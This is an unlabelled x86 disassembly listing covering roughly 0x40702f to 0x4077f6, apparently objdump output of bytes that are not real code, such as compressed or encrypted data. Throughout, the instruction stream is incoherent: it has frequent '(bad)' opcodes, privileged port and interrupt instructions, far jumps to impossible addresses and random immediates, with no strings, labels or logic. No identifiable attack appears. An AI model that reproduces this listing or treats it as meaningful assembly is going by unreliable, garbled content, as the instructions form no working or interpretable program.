  40702f:	fild   DWORD PTR [ebp-0x30]
  407032:	pop    esi
  407033:	in     eax,dx
  407034:	xor    ebx,DWORD PTR [ebx]
  407036:	push   fs
  407038:	lods   al,BYTE PTR ds:[esi]
  407039:	leave  
  40703a:	sbb    ebx,esi
  40703c:	adc    DWORD PTR [edi],0x72
  40703f:	xor    al,0x85
  407041:	and    BYTE PTR [eax],dh
  407043:	and    ecx,DWORD PTR [edx]
  407045:	dec    ebp
  407046:	sbb    al,BYTE PTR [eax]
  407048:	jns    0x40707f
  40704a:	cli    
  40704b:	dec    ebp
  40704c:	jl     0x407006
  40704e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40704f:	push   0xffffff85
  407051:	stos   BYTE PTR es:[edi],al
  407052:	sar    BYTE PTR [edi-0x577e7d81],0x17
  407059:	addr16 leave 
  40705b:	add    esi,ebp
  40705d:	jnp    0x407074
  40705f:	sbb    ebx,ecx
  407061:	sub    dl,ch
  407063:	mov    cl,0x1
  407065:	sub    eax,0x3e97966b
  40706a:	xchg   ebx,eax
  40706b:	cmp    ebp,DWORD PTR [edx]
  40706d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40706e:	ss sbb al,0x7b
  407071:	popf   
  407072:	jmp    0x407002
  407074:	ret    
  407075:	push   ecx
  407076:	(bad)  
  407077:	in     al,0xd6
  407079:	cmp    al,0x20
  40707b:	xchg   BYTE PTR [ebp-0x4b],ch
  40707e:	int    0x33
  407080:	out    0x86,al
  407082:	and    al,0x40
  407084:	scas   al,BYTE PTR es:[edi]
  407085:	(bad)  
  407087:	dec    edx
  407088:	adc    al,0x59
  40708a:	jae    0x4070a4
  40708c:	fimul  WORD PTR ds:[ebp-0x54]
  407090:	imul   esp,eax,0x7b
  407093:	mov    edx,0x563963bd
  407098:	js     0x40706f
  40709a:	scas   eax,DWORD PTR es:[edi]
  40709b:	jne    0x40703c
  40709d:	iret   
  40709e:	aas    
  40709f:	push   edx
  4070a0:	mov    al,al
  4070a2:	xor    al,0xc4
  4070a4:	sar    DWORD PTR [esi-0x40],1
  4070a7:	pop    edx
  4070a8:	jno    0x40709d
  4070aa:	hlt    
  4070ab:	mov    ds:0x4073fc2b,al
  4070b0:	sahf   
  4070b1:	popa   
  4070b2:	xchg   ecx,eax
  4070b3:	arpl   bx,sp
  4070b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b6:	jo     0x40711e
  4070b8:	ja     0x407139
  4070ba:	xchg   esp,eax
  4070bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070bc:	xlat   BYTE PTR ds:[ebx]
  4070bd:	idiv   DWORD PTR [edx-0x259c94cd]
  4070c3:	sbb    al,0xb5
  4070c5:	loopne 0x4070fe
  4070c7:	xor    al,0x5a
  4070c9:	arpl   WORD PTR [eax],ax
  4070cb:	mov    ds:0xf98dfe34,al
  4070d0:	in     eax,dx
  4070d1:	mov    al,BYTE PTR [edi+0x37]
  4070d4:	lahf   
  4070d5:	sbb    DWORD PTR [esi],ecx
  4070d7:	jp     0x4070d5
  4070d9:	jl     0x4070ff
  4070db:	mov    dh,BYTE PTR [ecx-0x5c040a59]
  4070e1:	adc    eax,0x2513207e
  4070e6:	mov    ds:0x3fe17168,al
  4070eb:	and    DWORD PTR [ebx],eax
  4070ed:	popf   
  4070ee:	aad    0x2e
  4070f0:	dec    ebx
  4070f1:	outs   dx,BYTE PTR ds:[esi]
  4070f2:	daa    
  4070f3:	sbb    BYTE PTR ds:0xbf12ab36,dl
  4070f9:	loope  0x4070e8
  4070fb:	popf   
  4070fc:	clc    
  4070fd:	inc    esi
  4070fe:	jle    0x4070d4
  407100:	sar    BYTE PTR [esp+ebx*1-0x1a],1
  407104:	lock push esp
  407106:	test   BYTE PTR [edx+eiz*1],al
  407109:	sbb    BYTE PTR [ecx],cl
  40710b:	icebp  
  40710c:	rcl    DWORD PTR [esi],0x76
  40710f:	retf   0x3504
  407112:	ror    DWORD PTR [ecx],0x90
  407115:	loope  0x4070a1
  407117:	ds mov ecx,0x4e91242e
  40711d:	stc    
  40711e:	mov    ebp,eax
  407120:	xchg   esi,eax
  407121:	mov    bh,0xe1
  407123:	ret    0xf61d
  407126:	dec    esp
  407127:	cmp    al,0x2d
  407129:	aad    0xfb
  40712b:	and    DWORD PTR [ecx-0x3a81b19a],ebx
  407131:	jmp    0x3f359e1d
  407136:	mov    eax,ds:0xc21741df
  40713b:	adc    dl,BYTE PTR [edi+eax*8]
  40713e:	test   BYTE PTR [ecx],ah
  407140:	nop
  407141:	jp     0x40711d
  407143:	imul   esi,DWORD PTR [ebx+0x70f5e173],0xbe3d073b
  40714d:	adc    BYTE PTR [ecx+0x10],cl
  407150:	test   BYTE PTR [edi+0x623f90dd],0x79
  407157:	mov    dl,0x24
  407159:	dec    ecx
  40715a:	push   0xffffffca
  40715c:	pop    edx
  40715d:	stc    
  40715e:	stc    
  40715f:	adc    BYTE PTR [ebp+0x2e931e16],dl
  407165:	xor    DWORD PTR [edi+0x3f756430],0x6710a114
  40716f:	push   cs
  407170:	lds    ecx,FWORD PTR [ecx+0x2033b4d2]
  407176:	in     al,0x25
  407178:	and    DWORD PTR [ecx+0x4],esi
  40717b:	cdq    
  40717c:	jmp    0x40714d
  40717e:	xchg   ecx,eax
  40717f:	daa    
  407180:	es pop ecx
  407182:	imul   ecx,DWORD PTR [ebx],0xde265082
  407188:	or     DWORD PTR [ebx],esp
  40718a:	mov    eax,0x911dce80
  40718f:	jo     0x407131
  407191:	dec    ebx
  407192:	mov    dh,0x99
  407194:	adc    bh,BYTE PTR [eax+0x37e7a167]
  40719a:	xchg   ecx,eax
  40719b:	pop    ds
  40719c:	mov    edx,0xc6a1aaf7
  4071a1:	dec    esi
  4071a2:	sub    esp,eax
  4071a4:	add    bl,bh
  4071a6:	arpl   WORD PTR [ebp+0x61],cx
  4071a9:	loope  0x40713c
  4071ab:	jmp    0x6b115bb1
  4071b0:	jge    0x407204
  4071b2:	daa    
  4071b3:	jecxz  0x40716c
  4071b5:	scas   eax,DWORD PTR es:[edi]
  4071b6:	mov    bh,0xe3
  4071b8:	dec    eax
  4071b9:	push   ebp
  4071ba:	in     eax,0x65
  4071bc:	xlat   BYTE PTR ds:[ebx]
  4071bd:	ja     0x407205
  4071bf:	jp     0x407163
  4071c1:	push   0xf8e3df6e
  4071c6:	test   esi,esp
  4071c8:	lds    ebp,FWORD PTR [ebx]
  4071ca:	cmp    ebp,DWORD PTR [ecx-0x7c56a151]
  4071d0:	jns    0x407166
  4071d2:	adc    BYTE PTR [edi+0x3b],dh
  4071d5:	daa    
  4071d6:	pop    ss
  4071d7:	or     ecx,eax
  4071d9:	mov    ebp,0x71ad5215
  4071de:	test   BYTE PTR [ecx-0x58],dh
  4071e1:	(bad)  
  4071e2:	in     eax,0x12
  4071e4:	mov    eax,ds:0xb45f7a8c
  4071e9:	dec    edi
  4071ea:	(bad)  
  4071eb:	test   DWORD PTR [ebx],0xae854660
  4071f1:	dec    edi
  4071f2:	jl     0x40722e
  4071f4:	sbb    DWORD PTR [eax],ecx
  4071f6:	imul   ebx,DWORD PTR [ebx-0x34],0x37
  4071fa:	lods   al,BYTE PTR ds:[esi]
  4071fb:	xor    esi,esi
  4071fd:	mov    ebx,0x7e32e916
  407202:	push   edi
  407203:	rcr    cl,cl
  407205:	jge    0x407280
  407207:	jbe    0x4071f1
  407209:	cdq    
  40720a:	fstp   DWORD PTR [edx-0x51]
  40720d:	ffree  st(0)
  40720f:	adc    eax,0xa9aa05da
  407214:	stos   DWORD PTR es:[edi],eax
  407215:	les    ebx,FWORD PTR [edi]
  407217:	and    eax,0xa225ce7f
  40721c:	int    0x2b
  40721e:	add    al,0xdb
  407220:	jle    0x4071de
  407222:	cld    
  407223:	aam    0xe3
  407225:	mov    edx,0x2cde0e69
  40722a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40722b:	in     al,0x6d
  40722d:	es mov ebp,gs
  407230:	(bad)  
  407231:	pop    ss
  407232:	push   0x6a
  407234:	ret    0x7df7
  407237:	ficomp WORD PTR ds:0x360136c3
  40723d:	pop    edi
  40723e:	xchg   esi,eax
  40723f:	dec    esp
  407240:	sub    edx,DWORD PTR [eax+0xb]
  407243:	lods   eax,DWORD PTR ds:[esi]
  407244:	or     dh,BYTE PTR [edi]
  407246:	out    0x82,al
  407248:	les    ebx,FWORD PTR [edx-0x6689423]
  40724e:	ror    ch,0x23
  407251:	test   al,0xf7
  407253:	rcr    BYTE PTR [edx-0x16],0xa0
  407257:	fcom   QWORD PTR [eax-0x27]
  40725a:	icebp  
  40725b:	xchg   edi,eax
  40725c:	dec    ebp
  40725d:	(bad)  
  40725e:	mov    fs,WORD PTR [eax+0x707e140f]
  407264:	(bad)  
  407265:	mov    ebx,0x9f842842
  40726a:	stc    
  40726b:	dec    ebp
  40726c:	mov    ecx,0xef383d06
  407271:	sbb    eax,0x258c0188
  407276:	adc    ecx,edi
  407278:	cmp    al,0x66
  40727a:	mov    bl,0x22
  40727c:	adc    eax,0x85fe01e6
  407281:	jmp    0x6e3bcad0
  407286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407287:	(bad)  
  407288:	ficom  DWORD PTR [ebp+0x28eee1a]
  40728e:	xchg   ebx,eax
  40728f:	xchg   DWORD PTR [ecx+esi*4],esp
  407292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407293:	call   0xf3ec5251
  407298:	ins    DWORD PTR es:[edi],dx
  407299:	dec    edi
  40729a:	rcr    DWORD PTR [ecx-0x4a],cl
  40729d:	stos   BYTE PTR es:[edi],al
  40729e:	(bad)  
  40729f:	jmp    0xcdf1:0xad6e270c
  4072a6:	rcr    DWORD PTR [edi],1
  4072a8:	test   eax,0xbb56175a
  4072ad:	xlat   BYTE PTR ds:[ebx]
  4072ae:	je     0x40724a
  4072b0:	mov    ds:0xa728cd57,al
  4072b5:	inc    ebx
  4072b6:	sub    edi,DWORD PTR [edx-0x69303aa6]
  4072bc:	ficomp DWORD PTR [edi-0x505f6a9f]
  4072c2:	sbb    eax,0xd3ee5c2
  4072c7:	sub    esp,ebx
  4072c9:	outs   dx,DWORD PTR ds:[esi]
  4072ca:	sbb    BYTE PTR [edx],0xf
  4072cd:	ins    BYTE PTR es:[edi],dx
  4072ce:	cdq    
  4072cf:	cmc    
  4072d0:	sbb    al,ch
  4072d2:	fdivr  QWORD PTR [ebx]
  4072d4:	aad    0x67
  4072d6:	xchg   esi,eax
  4072d7:	push   ebx
  4072d8:	data16 out 0xc4,al
  4072db:	ds mov eax,0x8daee837
  4072e1:	mov    edi,0x70a73694
  4072e6:	inc    esi
  4072e7:	(bad)
  4072ea:	je     0x4072aa
  4072ec:	push   ecx
  4072ed:	mov    dh,0xe0
  4072ef:	mov    ch,0x4a
  4072f1:	mov    ecx,0x83e4acec
  4072f6:	mov    cl,0xa7
  4072f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072f9:	cli    
  4072fa:	adc    eax,0x945132ea
  4072ff:	leave  
  407300:	xchg   DWORD PTR [ecx-0x6b],eax
  407303:	push   es
  407304:	sahf   
  407305:	mov    eax,0x97827559
  40730a:	addr16 test eax,0x6896a5b3
  407310:	aad    0xb1
  407312:	mov    bl,0x65
  407314:	mov    ah,0x77
  407316:	jg     0x4072f5
  407318:	bound  ebx,QWORD PTR [eax-0x63f169fa]
  40731e:	sti    
  40731f:	pop    ebp
  407320:	sbb    DWORD PTR [edx],esi
  407322:	nop
  407323:	jl     0x40736a
  407325:	mov    dl,0x13
  407327:	fistp  QWORD PTR [ebp-0x4c11b3df]
  40732d:	or     dh,al
  40732f:	dec    esp
  407330:	inc    esp
  407331:	in     al,0xf0
  407333:	std    
  407334:	nop
  407335:	add    eax,0xb4af0d9a
  40733a:	pop    ss
  40733b:	fs xchg ecx,eax
  40733d:	and    esi,esp
  40733f:	mov    WORD PTR [esi-0x25],gs
  407342:	test   eax,0xb0157a07
  407347:	dec    ebp
  407348:	loope  0x40738c
  40734a:	push   esp
  40734b:	sbb    eax,0x7fc6a4ce
  407350:	cli    
  407351:	pop    es
  407352:	push   ecx
  407353:	cmp    eax,DWORD PTR [ebp-0x10192c39]
  407359:	(bad)  
  40735a:	(bad)  [edi-0x10]
  40735d:	jb     0x407360
  40735f:	cmp    bh,BYTE PTR [edx]
  407361:	retf   0x97dd
  407364:	xchg   edi,eax
  407365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407366:	jg     0x407390
  407368:	mov    eax,0xb0885311
  40736d:	fdiv   QWORD PTR [esi]
  40736f:	(bad)  
  407370:	jg     0x4073dc
  407372:	cli    
  407373:	shr    DWORD PTR es:[esp+eax*8-0x2d],0x60
  407379:	ret    
  40737a:	gs das 
  40737c:	sbb    bh,0xa4
  40737f:	outs   dx,DWORD PTR ds:[esi]
  407380:	pop    esp
  407381:	test   DWORD PTR [edx],esp
  407383:	jns    0x4073a4
  407385:	je     0x4073c0
  407387:	push   es
  407388:	push   edi
  407389:	add    DWORD PTR [esi-0x31],eax
  40738c:	jl     0x407397
  40738e:	ficom  WORD PTR [edx-0x7b97ead9]
  407394:	xchg   ebx,eax
  407395:	pop    ebx
  407396:	popa   
  407397:	lods   al,BYTE PTR ds:[esi]
  407398:	and    eax,0x8afd6a06
  40739d:	into   
  40739e:	fwait
  40739f:	mov    eax,ds:0x44d606e2
  4073a4:	dec    esi
  4073a5:	inc    esi
  4073a6:	mov    bh,0xc9
  4073a8:	and    edi,DWORD PTR [edx-0x1eba42d3]
  4073ae:	mov    bl,0xb8
  4073b0:	jns    0x40736a
  4073b2:	mov    eax,0x973b8441
  4073b7:	jge    0x4073db
  4073b9:	push   cs
  4073ba:	(bad)  
  4073bb:	sar    DWORD PTR [eax],1
  4073bd:	mov    ds:0x627052fe,al
  4073c2:	arpl   WORD PTR [ebx+eax*8],sp
  4073c5:	jne    0x4073cd
  4073c7:	push   ds
  4073c8:	arpl   bx,bx
  4073ca:	jle    0x4073d2
  4073cc:	retf   0x1b9f
  4073cf:	sahf   
  4073d0:	adc    al,0xf3
  4073d2:	adc    DWORD PTR [esi+eax*4+0x56],0x7e7a5537
  4073da:	in     al,0xcb
  4073dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073dd:	push   cs
  4073de:	mov    cl,0x4e
  4073e0:	sbb    edi,DWORD PTR [edx-0x2779efe3]
  4073e6:	aas    
  4073e7:	repnz jmp 0x3af6:0xfc2d6d4d
  4073ef:	aam    0x5a
  4073f1:	out    0x7,al
  4073f3:	sahf   
  4073f4:	scas   al,BYTE PTR es:[edi]
  4073f5:	test   BYTE PTR [ecx+0x44377e33],dh
  4073fb:	ror    edx,1
  4073fd:	push   ds
  4073fe:	sbb    ebp,DWORD PTR [ecx+0x176e679b]
  407404:	dec    edx
  407405:	add    eax,DWORD PTR [esi+eax*1]
  407408:	aas    
  407409:	je     0x4073c2
  40740b:	or     eax,esp
  40740d:	adc    eax,0x2f97d575
  407412:	jmp    0x407468
  407414:	lea    esp,[ebp+0x6ff8c709]
  40741a:	inc    esi
  40741b:	xchg   esi,eax
  40741c:	inc    ecx
  40741d:	outs   dx,BYTE PTR ds:[esi]
  40741e:	call   0x4f96057
  407423:	xchg   ebp,eax
  407424:	hlt    
  407425:	mov    ebp,0x787bc30e
  40742a:	xchg   ebx,eax
  40742b:	jmp    0x185c5d3c
  407430:	pop    edi
  407431:	in     eax,0x17
  407433:	dec    esp
  407434:	pop    es
  407435:	sbb    DWORD PTR [ebx],edi
  407437:	sbb    BYTE PTR [edx-0x14],bl
  40743a:	mov    esi,DWORD PTR [ecx+0x49841130]
  407440:	sbb    edx,DWORD PTR [eax]
  407442:	mov    ebp,0xb008087d
  407447:	pop    ebx
  407448:	(bad)  
  407449:	leave  
  40744a:	dec    edi
  40744b:	push   ebx
  40744c:	mov    ebx,0x3ffa4f6c
  407451:	add    bh,BYTE PTR [ebx-0x46]
  407454:	jbe    0x407490
  407456:	sub    edx,DWORD PTR [eax]
  407458:	stc    
  407459:	sub    ebx,esi
  40745b:	dec    esi
  40745c:	xlat   BYTE PTR ds:[ebx]
  40745d:	nop
  40745e:	push   eax
  40745f:	add    dh,BYTE PTR [esi-0x78]
  407462:	(bad)  [edi-0x5d4ab552]
  407468:	icebp  
  407469:	adc    BYTE PTR [eax],cl
  40746b:	ds xor BYTE PTR fs:[ebx+0x6b],bh
  407470:	aas    
  407471:	sbb    ebx,DWORD PTR [ecx+ebp*4-0x6d]
  407475:	push   ss
  407476:	or     edx,DWORD PTR [esi+0x5b]
  407479:	pushaw 
  40747b:	and    al,BYTE PTR [edx+ebp*4]
  40747e:	adc    ecx,DWORD PTR [ebp-0x73]
  407481:	adc    eax,0x38918128
  407486:	jno    0x40745d
  407488:	int3   
  407489:	inc    ebx
  40748a:	or     dh,BYTE PTR [eax-0x7d]
  40748d:	mov    ebx,esp
  40748f:	not    BYTE PTR [edx]
  407491:	jb     0x407480
  407493:	out    0x5a,eax
  407495:	xchg   BYTE PTR [ebp+0x70],dh
  407498:	lahf   
  407499:	das    
  40749a:	dec    ecx
  40749b:	in     al,dx
  40749c:	into   
  40749d:	jmp    FWORD PTR [edx]
  40749f:	sbb    eax,DWORD PTR [esi-0x1d692385]
  4074a5:	sbb    BYTE PTR [edx+0x17d84fbf],dl
  4074ab:	push   ebp
  4074ac:	jno    0x407492
  4074ae:	cmc    
  4074af:	cmp    bh,BYTE PTR [eax+0xf]
  4074b2:	(bad)  [ebx-0x37]
  4074b5:	xchg   edi,eax
  4074b6:	repz gs jmp 0xaa28688c
  4074bd:	(bad)  
  4074be:	sbb    BYTE PTR gs:[eax],bl
  4074c1:	es jns 0x4074a8
  4074c4:	adc    al,0x7e
  4074c6:	mov    ch,0x3b
  4074c8:	mov    al,0xfd
  4074ca:	cdq    
  4074cb:	(bad)  
  4074cc:	dec    ebp
  4074cd:	into   
  4074ce:	push   ecx
  4074cf:	mov    esp,0xcfbf515a
  4074d4:	adc    eax,0xa692f0bb
  4074d9:	mov    bh,0x3e
  4074db:	xchg   esp,ebp
  4074dd:	mov    WORD PTR [eax+0x5],ds
  4074e0:	mov    ebp,0x38e397cc
  4074e5:	scas   eax,DWORD PTR es:[edi]
  4074e6:	sbb    eax,0xe6f50b89
  4074eb:	xor    al,0x99
  4074ed:	jne    0x40754d
  4074ef:	xor    BYTE PTR [eax-0x19],ch
  4074f2:	push   edx
  4074f3:	sub    edx,DWORD PTR [eax+0x2c]
  4074f6:	es enter 0xbeeb,0x60
  4074fb:	imul   edx,esp,0x657cee70
  407501:	sti    
  407502:	xchg   edi,eax
  407503:	xor    ecx,DWORD PTR [ebx+0xd]
  407506:	xor    cl,bh
  407508:	sub    BYTE PTR [edx],ah
  40750a:	enter  0xab73,0xd
  40750e:	mov    bl,0xe4
  407510:	lahf   
  407511:	(bad)  
  407512:	xor    DWORD PTR [ebp+0x1449334f],eax
  407518:	ins    BYTE PTR es:[edi],dx
  407519:	sbb    DWORD PTR [edx+0x5a],edi
  40751c:	dec    esp
  40751d:	test   DWORD PTR [edi+0x45],ebx
  407520:	jge    0x407545
  407522:	mov    eax,0x20217c5d
  407527:	and    DWORD PTR [edi+ebp*2+0x51],ebp
  40752b:	jg     0x407528
  40752d:	ds scas eax,DWORD PTR es:[edi]
  40752f:	mov    ch,0x4b
  407531:	add    BYTE PTR [eax+eax*4+0x70],bl
  407535:	cmp    bh,dl
  407537:	pushf  
  407538:	dec    ecx
  407539:	push   es
  40753a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40753b:	sub    al,0x76
  40753d:	pop    ss
  40753e:	sbb    DWORD PTR fs:[ecx+edx*2],ebx
  407542:	fild   DWORD PTR [eax+0x45178929]
  407548:	pusha  
  407549:	sbb    DWORD PTR [esi-0x30c616e],ecx
  40754f:	in     al,dx
  407550:	xchg   BYTE PTR [edi],ch
  407552:	loop   0x407537
  407554:	stos   BYTE PTR es:[edi],al
  407555:	mov    ch,0xf5
  407557:	popa   
  407558:	stc    
  407559:	xchg   ecx,eax
  40755a:	test   al,0x6d
  40755c:	pop    ds
  40755d:	out    0x4e,al
  40755f:	scas   eax,DWORD PTR es:[edi]
  407560:	iret   
  407561:	sbb    al,0xc6
  407563:	les    ecx,FWORD PTR [ebx-0x2312e8d7]
  407569:	xchg   BYTE PTR [edx+0x69f94407],ch
  40756f:	mov    ebp,0xace56764
  407574:	pop    es
  407575:	retf   
  407576:	xchg   edx,eax
  407577:	cmp    ecx,DWORD PTR [edi+edi*4-0x34f847ed]
  40757e:	in     eax,dx
  40757f:	xchg   ecx,eax
  407580:	mov    DWORD PTR [ecx-0x4f77c296],eax
  407586:	loop   0x40759e
  407588:	xchg   edx,eax
  407589:	dec    ecx
  40758a:	iret   
  40758b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40758c:	sbb    eax,0xa6ce2d47
  407591:	jp     0x407535
  407593:	mov    cl,0x33
  407595:	push   0xcf3fdb79
  40759a:	int    0xb4
  40759c:	in     eax,0x5f
  40759e:	sub    eax,0xcd5bd7f2
  4075a3:	pop    ss
  4075a4:	js     0x40755d
  4075a6:	add    ebx,DWORD PTR gs:[ebx+0x75e1471a]
  4075ad:	cmp    eax,0x8e204e10
  4075b2:	cli    
  4075b3:	rcl    DWORD PTR ds:0x23c323d,0x30
  4075ba:	pusha  
  4075bb:	pop    bp
  4075bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075be:	test   BYTE PTR [esi-0xd],bh
  4075c1:	mov    al,0x6d
  4075c3:	retf   0xa801
  4075c6:	dec    DWORD PTR [eax]
  4075c8:	cmc    
  4075c9:	daa    
  4075ca:	lds    esi,FWORD PTR [ecx-0x3def1ac2]
  4075d0:	sar    BYTE PTR [edx],1
  4075d2:	fadd   QWORD PTR [ebp+0x10761c17]
  4075d8:	test   DWORD PTR [edi+0x7521cbc1],ecx
  4075de:	out    0x20,eax
  4075e0:	pusha  
  4075e1:	push   cs
  4075e2:	ffree  st(3)
  4075e4:	sti    
  4075e5:	inc    edi
  4075e6:	mov    esi,0x3c6aa29c
  4075eb:	pop    ebx
  4075ec:	loope  0x4075a0
  4075ee:	iret   
  4075ef:	aaa    
  4075f0:	mov    esi,0xd6438183
  4075f5:	push   ecx
  4075f6:	mov    al,ds:0x7b3a7167
  4075fb:	mov    bh,0x6f
  4075fd:	aas    
  4075fe:	adc    DWORD PTR [ecx+0x7c],esi
  407601:	sbb    DWORD PTR [ecx-0x7],edx
  407604:	popa   
  407605:	(bad)  
  407606:	or     al,0x5d
  407608:	ins    DWORD PTR es:[edi],dx
  407609:	(bad)  
  40760a:	popa   
  40760b:	ins    BYTE PTR es:[edi],dx
  40760c:	fwait
  40760d:	jle    0x407654
  40760f:	cmp    al,0x58
  407611:	fyl2x  
  407613:	adc    BYTE PTR [ecx],bh
  407615:	xor    DWORD PTR [edx+0x23],eax
  407618:	pop    es
  407619:	sbb    al,0x86
  40761b:	ret    0x84bb
  40761e:	pushf  
  40761f:	dec    ebp
  407620:	jns    0x40766e
  407622:	pop    esp
  407623:	cmc    
  407624:	sbb    eax,0x7ba6ee91
  407629:	pop    ss
  40762a:	sahf   
  40762b:	and    eax,0xfc4cfd5e
  407630:	xor    al,0xe1
  407632:	jb     0x40760e
  407634:	push   edi
  407635:	jo     0x40768b
  407637:	jae    0x4075ee
  407639:	shufps xmm7,XMMWORD PTR [eax+edx*8+0x157eaf2e],0xc
  407642:	adc    ecx,DWORD PTR [edx+eax*2]
  407645:	hlt    
  407646:	sub    DWORD PTR [ecx-0x5de950ba],edi
  40764c:	js     0x40765d
  40764e:	ret    
  40764f:	pop    ebx
  407650:	retf   
  407651:	ja     0x407642
  407653:	mov    ecx,0x292652
  407658:	mov    ecx,0x1605d00a
  40765d:	pop    esi
  40765e:	pop    ecx
  40765f:	shr    DWORD PTR [eax+0x498f718c],0xbe
  407666:	imul   esp,DWORD PTR [eax],0xffffffa8
  407669:	mov    bl,0xaa
  40766b:	in     eax,dx
  40766c:	sub    DWORD PTR [ecx+0x3e],ebx
  40766f:	xor    al,0xcd
  407671:	ds mov esi,0xb1556e35
  407677:	jbe    0x407661
  407679:	mov    bl,0x1b
  40767b:	sbb    cl,BYTE PTR [edx+0x3ca3727b]
  407681:	xchg   esi,eax
  407682:	scas   eax,DWORD PTR es:[edi]
  407683:	xor    DWORD PTR [edi+ebp*8-0x45],esp
  407687:	ds in  eax,0x2f
  40768a:	ins    BYTE PTR es:[edi],dx
  40768b:	dec    esp
  40768c:	fst    st(7)
  40768e:	lea    esi,[esp+ebp*2]
  407691:	or     eax,0xf78fe010
  407696:	mov    ds:0xa401b9d6,eax
  40769b:	fmul   DWORD PTR [ecx+0xa009612]
  4076a1:	ins    BYTE PTR es:[edi],dx
  4076a2:	adc    bh,BYTE PTR fs:[edi-0x44118965]
  4076a9:	in     al,0x26
  4076ab:	jge    0x40770a
  4076ad:	in     al,dx
  4076ae:	cdq    
  4076af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b0:	push   eax
  4076b1:	cdq    
  4076b2:	cs out 0x3c,al
  4076b5:	dec    edi
  4076b6:	add    esi,DWORD PTR [eax+0x53]
  4076b9:	stos   DWORD PTR es:[edi],eax
  4076ba:	adc    al,0x98
  4076bc:	xchg   esi,eax
  4076bd:	sbb    al,0x13
  4076bf:	mov    bl,0x11
  4076c1:	or     edx,DWORD PTR [eax-0xa921754]
  4076c7:	jmp    0xbade:0xa8be8b31
  4076ce:	int3   
  4076cf:	and    al,0xd4
  4076d1:	ret    
  4076d2:	hlt    
  4076d3:	adc    dl,BYTE PTR ds:0xf54ff499
  4076d9:	sahf   
  4076da:	mov    ds:0xad6fd65,eax
  4076df:	jle    0x407675
  4076e1:	sub    BYTE PTR [ecx],cl
  4076e3:	jb     0x4076ea
  4076e5:	call   esi
  4076e7:	cli    
  4076e8:	push   ss
  4076e9:	inc    esp
  4076ea:	mov    BYTE PTR [esi+0x73b17f51],ah
  4076f0:	jne    0x407714
  4076f2:	fstp   TBYTE PTR [ebp+0x157e8891]
  4076f8:	arpl   WORD PTR [edx-0x76],dx
  4076fb:	les    edi,FWORD PTR [ecx+0x70]
  4076fe:	mov    al,0x45
  407700:	rcl    BYTE PTR [esi],1
  407702:	cld    
  407703:	and    ecx,edi
  407705:	cmp    al,0x28
  407707:	sar    bh,0xae
  40770a:	cmp    DWORD PTR [esi-0x3e],esp
  40770d:	out    0x90,al
  40770f:	nop
  407710:	leave  
  407711:	and    cl,al
  407713:	repnz dec edx
  407716:	xor    eax,0x2d55a88a
  40771b:	mov    dh,0x85
  40771d:	mov    ecx,DWORD PTR [ebx-0x53]
  407720:	xchg   ebx,eax
  407721:	mov    al,dl
  407723:	or     DWORD PTR [eax-0x48],edx
  407726:	imul   ebx,DWORD PTR [esi],0x7d
  407729:	mov    al,ds:0x46a4439c
  40772e:	add    BYTE PTR [esi-0x731b0d8a],dh
  407734:	cmp    BYTE PTR [eax+0x8],0x8
  407738:	and    dl,BYTE PTR [edi-0x7180e914]
  40773e:	(bad)  
  40773f:	int3   
  407740:	mov    esi,0xcd33c579
  407745:	shl    esi,1
  407747:	jne    0x407786
  407749:	cmc    
  40774a:	xchg   esi,eax
  40774b:	mov    BYTE PTR [esi+0x7e6fcf1a],cl
  407751:	add    BYTE PTR [edi+0x1f08a06a],bl
  407757:	lods   al,BYTE PTR ds:[esi]
  407758:	lahf   
  407759:	imul   edi,DWORD PTR es:[ecx+0x0],0xfffffff6
  40775e:	rcr    esi,0xa0
  407761:	call   0x347e0eb2
  407766:	jmp    0xfa17:0x8d155cd5
  40776d:	test   eax,0xd582909b
  407772:	xchg   ecx,eax
  407773:	pop    eax
  407774:	pop    ebx
  407775:	pop    es
  407776:	mov    dl,BYTE PTR [esi]
  407778:	jecxz  0x40775c
  40777a:	sub    BYTE PTR [ebp-0x35],dh
  40777d:	dec    ebp
  40777e:	cmp    ch,bl
  407780:	(bad)  
  407781:	jb     0x40776f
  407783:	arpl   WORD PTR [eax-0x70],dx
  407786:	xchg   esi,eax
  407787:	inc    esi
  407788:	loopne 0x407767
  40778a:	xor    DWORD PTR [ecx-0x59],0xb2122844
  407791:	and    DWORD PTR [esi],ebx
  407793:	xchg   dl,dl
  407795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407796:	(bad)  
  407797:	mov    ecx,0x6767619c
  40779c:	in     al,0x34
  40779e:	dec    eax
  40779f:	sub    al,0x73
  4077a1:	pop    edi
  4077a2:	and    al,0xdd
  4077a4:	outs   dx,BYTE PTR ds:[esi]
  4077a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077a6:	xor    al,0x55
  4077a8:	stos   DWORD PTR es:[edi],eax
  4077a9:	mov    ebp,0x385db90e
  4077ae:	cmp    DWORD PTR [ebx+0x3fb9799c],esi
  4077b4:	data16 mov al,0xe5
  4077b7:	mov    eax,0x1127bb9a
  4077bc:	mov    edi,0x81f8a71c
  4077c1:	sub    BYTE PTR [eax+0x71],ch
  4077c4:	mov    edx,0x9e62feda
  4077c9:	jmp    0x5d862d9d
  4077ce:	mov    edi,0xfd4c1ff6
  4077d3:	inc    edx
  4077d4:	push   0xffffff9f
  4077d6:	jmp    0x407833
  4077d8:	push   esp
  4077d9:	mov    edi,0x40c5f483
  4077de:	addr16 mov ebp,0x83646e12
  4077e4:	pop    edx
  4077e5:	mov    es,WORD PTR [edi+0x6fbc1f9e]
  4077eb:	xchg   ecx,eax
  4077ec:	mov    eax,0xa08dabd8
  4077f1:	add    eax,0x7c732a3b
  4077f6:	xor    DWORD PTR [ebx],edx
